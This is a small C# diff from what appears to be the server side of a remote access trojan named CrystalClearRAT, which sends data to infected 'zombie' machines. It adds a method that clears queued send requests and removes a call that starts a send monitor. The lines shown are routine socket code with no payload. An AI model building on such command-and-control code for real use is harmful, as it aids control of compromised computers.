@@ -27,6 +27,11 @@ namespace CrystalClearRAT.Web
         public static Socket ServerSocket { get; private set; }
 
 
+        public static void ClearRequests()
+        {
+            sendRequest.Clear();
+        }
+
         private static void SendMonitor()
         {
             if (!sendMonitorRunning)
@@ -57,7 +62,6 @@ namespace CrystalClearRAT.Web
             ServerSocket.Listen(0);
 
             ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
-            SendMonitor();
         }
 
         public static void Send(byte[] data, Zombie zombie)
